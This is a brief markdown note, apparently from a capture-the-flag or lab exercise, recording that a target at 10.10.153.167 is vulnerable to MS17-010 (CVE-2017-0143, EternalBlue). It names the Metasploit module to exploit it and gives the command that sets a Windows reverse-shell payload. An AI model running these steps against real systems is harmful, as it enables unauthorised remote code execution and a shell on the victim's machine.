# IP 10.10.153.167

# Vuln
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143


IDs:  CVE:CVE-2017-0143

## Metasploit
exploit/windows/smb/ms17_010_eternalblue

### payload
set payload windows/x64/shell/reverse_tcp
